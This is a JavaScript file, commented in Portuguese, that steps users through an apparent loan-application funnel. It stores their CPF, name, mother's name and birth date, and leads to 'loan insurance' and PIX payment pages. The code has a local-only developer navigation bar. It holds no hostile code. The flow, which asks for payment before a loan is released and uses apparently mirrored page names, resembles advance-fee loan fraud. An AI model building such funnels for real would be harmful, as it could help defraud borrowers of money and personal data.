/**
 * Sistema de Fluxo de Lead Completo
 * Gerencia navegação entre passos e dados do usuário
 *
 * MODO DESENVOLVIMENTO: Defina window.MODO_DEV = true no console ou localStorage.setItem('modoDesenv', 'true')
 * Também pode ativar/desativar pela URL: ?dev=1 liga, ?dev=0 desliga (fica salvo no localStorage)
 * Isso mostrará os botões Próximo/Voltar para testar o fluxo
 */

// Ambiente LOCAL apenas: o modo dev só funciona aqui (localhost/vscode),
// nunca no site publicado — assim nenhum lead consegue ativar com ?dev=1.
const IS_LOCAL = (function(){
  const h = window.location.hostname;
  return h === 'localhost' || h === '127.0.0.1' || h === '::1' || h === '' ||
         h.endsWith('.local') || window.location.protocol === 'file:';
})();

// Ativar/desativar pela query string (?dev=1 / ?dev=0) e persistir entre os passos — só local
if(IS_LOCAL){
  const paramDev = new URLSearchParams(window.location.search).get('dev');
  if(paramDev === '1') {
    localStorage.setItem('modoDesenv', 'true');
  } else if(paramDev === '0') {
    localStorage.removeItem('modoDesenv');
  }
}

// Detectar modo desenvolvimento (bloqueado fora do ambiente local)
const MODO_DEV = IS_LOCAL && (localStorage.getItem('modoDesenv') === 'true' || window.MODO_DEV === true);

const FLUXO = {
  // Mapa de todos os passos
  passos: [
    { id: 2, titulo: 'Verificação de Dados', url: '../2/indexcd8c.html', requisitos: [] },
    { id: 3, titulo: 'Informações do Empréstimo', url: '../3/indexcd8c.html', requisitos: ['cpf'] },
    { id: 4, titulo: 'Sua especialista', url: '../4/indexe217.html', requisitos: ['cpf'] },
    { id: 5, titulo: 'Análise de Crédito', url: '../5/indexe217.html', requisitos: ['cpf'] },
    { id: 6, titulo: 'Verificação Facial', url: '../6/indexe217.html', requisitos: ['cpf'] },
    { id: 7, titulo: 'Condições do Empréstimo', url: '../7/index3118.html', requisitos: ['cpf'] },
    { id: 8, titulo: 'Confirme seus Dados', url: '../8/index8f6f.html', requisitos: ['cpf'] },
    { id: 9, titulo: 'Seguro Prestamista', url: '../9/indexf5a9.html', requisitos: ['cpf'] },
    { id: 10, titulo: 'Confirmação do Empréstimo', url: '../10/indexae25.html', requisitos: ['cpf'] },
    { id: 11, titulo: 'Pagamento via PIX', url: '../pagamento/indexe698.html', requisitos: ['cpf'] }
  ],

  // Obter passo atual
  obterPassoAtual() {
    return parseInt(sessionStorage.getItem('passoAtual')) || 2;
  },

  // Definir passo atual
  definirPassoAtual(id) {
    sessionStorage.setItem('passoAtual', id);
  },

  // Obter dados do lead
  obterDados() {
    return {
      cpf: localStorage.getItem('cpf') || '',
      nome: localStorage.getItem('nome') || '',
      mae: localStorage.getItem('mae') || '',
      nascimento: localStorage.getItem('nascimento') || '',
      sexo: localStorage.getItem('sexo') || ''
    };
  },

  // Salvar dados do lead
  salvarDados(dados) {
    Object.keys(dados).forEach(chave => {
      if(dados[chave]) localStorage.setItem(chave, dados[chave]);
    });
  },

  // Ir para próximo passo
  proximoPasso() {
    const atual = this.obterPassoAtual();
    const proximo = this.passos.find(p => p.id > atual);
    if(proximo) {
      this.definirPassoAtual(proximo.id);
      // Remover query string e redirecionar apenas para o arquivo
      window.location.href = proximo.url.split('?')[0];
    }
  },

  // Ir para passo anterior
  passoAnterior() {
    const atual = this.obterPassoAtual();
    const anterior = this.passos.slice().reverse().find(p => p.id < atual);
    if(anterior) {
      this.definirPassoAtual(anterior.id);
      // Remover query string e redirecionar apenas para o arquivo
      window.location.href = anterior.url.split('?')[0];
    }
  },

  // Ir para passo específico
  irParaPasso(id) {
    const passo = this.passos.find(p => p.id === id);
    if(passo) {
      this.definirPassoAtual(id);
      // Remover query string e redirecionar apenas para o arquivo
      window.location.href = passo.url.split('?')[0];
    }
  },

  // Inicializar na página
  inicializar() {
    // Definir o passo baseado na URL
    const url = window.location.pathname;
    const match = url.match(/\/(\d+)\//);
    if(match) {
      this.definirPassoAtual(parseInt(match[1]));
    }

    // Restaurar dados do localStorage
    const dados = this.obterDados();
    if(dados.nome) {
      this.exibirDados(dados);
    }

    // Injetar navegador visual
    this.injetarNavegador();
  },

  // Injetar componente de navegação
  injetarNavegador() {
    const nav = document.querySelector('.fluxo-navigator');
    if(nav) return; // Já existe

    // Só mostrar navegador em modo desenvolvimento
    if(!MODO_DEV) return;

    // Não injetar nas páginas de pagamento/upsell: elas têm navegação dev própria
    // (upsell/devnav.js) e não fazem parte dos passos do funil (pastas 2..10)
    const _p = window.location.pathname;
    if(_p.indexOf('/upsell/') !== -1 || _p.indexOf('/pagamento/') !== -1) return;
    const _m = _p.match(/\/(\d+)\//);
    if(!_m || !this.passos.some(x => x.id === parseInt(_m[1]))) return;

    const container = document.createElement('div');
    container.style.cssText = 'position: fixed; bottom: 0; left: 0; right: 0; z-index: 1000; background: white;';

    container.innerHTML = `
      <style>
        .fluxo-navigator {
          display: flex;
          justify-content: space-between;
          align-items: center;
          gap: 12px;
          padding: 16px 20px;
          background: #FFFFFF;
          border-top: 1px solid #E5E7EB;
          position: relative;
          z-index: 100;
          max-width: 600px;
          margin: 0 auto;
        }
        .btn-voltar {
          padding: 10px 16px;
          background: #F3F4F6;
          border: 1px solid #E5E7EB;
          border-radius: 8px;
          cursor: pointer;
          font-size: 14px;
          font-weight: 500;
          color: #374151;
          transition: all 0.2s ease;
          display: flex;
          align-items: center;
          gap: 6px;
        }
        .btn-voltar:hover { background: #E5E7EB; transform: translateX(-2px); }
        .btn-voltar svg { width: 16px; height: 16px; }
        .fluxo-info {
          font-size: 12px;
          color: #9CA3AF;
          text-align: center;
          flex: 1;
        }
        .btn-proximo {
          padding: 10px 16px;
          background: #fa6300;
          border: none;
          border-radius: 8px;
          cursor: pointer;
          font-size: 14px;
          font-weight: 500;
          color: white;
          transition: all 0.2s ease;
          display: flex;
          align-items: center;
          gap: 6px;
        }
        .btn-proximo:hover { background: #d95400; transform: translateX(2px); }
        .btn-proximo:disabled { background: #D1D5DB; cursor: not-allowed; transform: none; }
        .btn-proximo svg { width: 16px; height: 16px; }
        .fluxo-progress {
          height: 3px;
          background: #E5E7EB;
          width: 100%;
          position: absolute;
          top: 0;
          left: 0;
        }
        .fluxo-progress-bar {
          height: 100%;
          background: linear-gradient(90deg, #fa6300, #d95400);
          transition: width 0.3s ease;
        }
      </style>
      <div class="fluxo-navigator">
        <div class="fluxo-progress">
          <div class="fluxo-progress-bar" id="progressBar"></div>
        </div>
        <button class="btn-voltar" id="btnVoltar" style="display:none;">
          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path>
          </svg>
          Voltar
        </button>
        <div class="fluxo-info" id="passoInfo"></div>
        <button class="btn-proximo" id="btnProximo">
          Próximo
          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path>
          </svg>
        </button>
      </div>
    `;

    document.body.appendChild(container);

    // Adicionar padding bottom ao body para não cobrir conteúdo
    document.body.style.paddingBottom = '80px';

    // Event listeners
    document.getElementById('btnVoltar').onclick = () => this.passoAnterior();
    document.getElementById('btnProximo').onclick = () => this.proximoPasso();

    // Atualizar progresso
    const passoAtual = this.obterPassoAtual();
    const totalPassos = this.passos.length;
    const indiceAtual = this.passos.findIndex(p => p.id === passoAtual);

    document.getElementById('passoInfo').textContent = `Passo ${indiceAtual + 1} de ${totalPassos}`;
    document.getElementById('btnVoltar').style.display = passoAtual === 2 ? 'none' : 'flex';

    const progress = ((indiceAtual + 1) / totalPassos) * 100;
    document.getElementById('progressBar').style.width = progress + '%';

    if(passoAtual === totalPassos) {
      document.getElementById('btnProximo').textContent = '💳 Ir para Pagamento';
    }
  },

  // Exibir dados na página (se houver elementos para isso)
  exibirDados(dados) {
    // Nome do usuário no header
    const nomeEl = document.getElementById('userName') || document.querySelector('.user-name');
    if(nomeEl && dados.nome) nomeEl.textContent = dados.nome.split(' ')[0];

    // CPF no header
    const cpfEl = document.querySelector('.user-cpf');
    if(cpfEl && dados.cpf) cpfEl.textContent = dados.cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
  }
};

// Expor globalmente: 'const FLUXO' não vira propriedade de window,
// então as páginas que checam 'window.FLUXO' precisam disto para não cair no fallback
window.FLUXO = FLUXO;

// Inicializar quando DOM estiver pronto
if(document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', () => FLUXO.inicializar());
} else {
  FLUXO.inicializar();
}
